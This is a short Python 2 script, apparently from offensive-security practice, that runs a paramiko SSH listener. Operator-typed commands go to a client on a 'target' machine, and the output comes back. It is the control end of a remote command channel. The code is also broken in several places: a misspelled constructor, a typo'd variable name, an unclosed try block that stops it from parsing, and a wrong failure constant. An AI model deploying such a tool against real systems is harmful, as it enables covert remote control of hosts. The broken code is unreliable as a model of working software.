# SSH Server
'''
this creates an ssh server that an ssh client can connect to. The target would need to have
Python and paramiko installed. 

'''

import socket
import paramiko
import threading
import sys

# your host key goes here
host_key = paramiko.RSAKey(file='test_rsa.key')

class Server (paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()
    
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.AUTH_FAILED
server = sys.argv[1]
ssh_port = int(sys.argv[2])

try: # Start the socket listener here so you can make a connection 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print "[-] Listening for connection..."
    client, addr = sock.accept()
    
except Exception, e:
    print '[-] Listen Failed: ' + str(e)
    sys.exit(1)
print '[+] Got a connection!'

try: # config auth when the client has authenticated 
    nty_session = paramiko.Transport(client)
    nty_session.add_server_key(host_key)
    server = Server()
    try:
        nty_session.start_server(server=server)
    except paramiko.SSHException, x:
        print '[-] SSH Negotiation failed.'
    chan = nty_session.accept(20)
    print '[+] YOU AUTHENTICATED!'
    print chan.recv(1024)
    chan.send('welcome to nty_ssh')
    '''
    any command that is sent to the server is then sent to the ssh client n_sshclient.py
    the output is then returned to the server.
    '''
    while True:
        try:
            command = raw_input("Enter Command: ").strip('\n')
            if command != 'exit:':
                chan.send(command)
                print chand.recv(1024) + '\n'
            else: 
                chan.send('exit')
                print 'exiting'
                nty_session.close()
    except Exception, e:
        print '[-] Caught Exception: ' + str(e)
        try:
            nty_session.close()
        except:
            pass
        sys.exit(1)
                
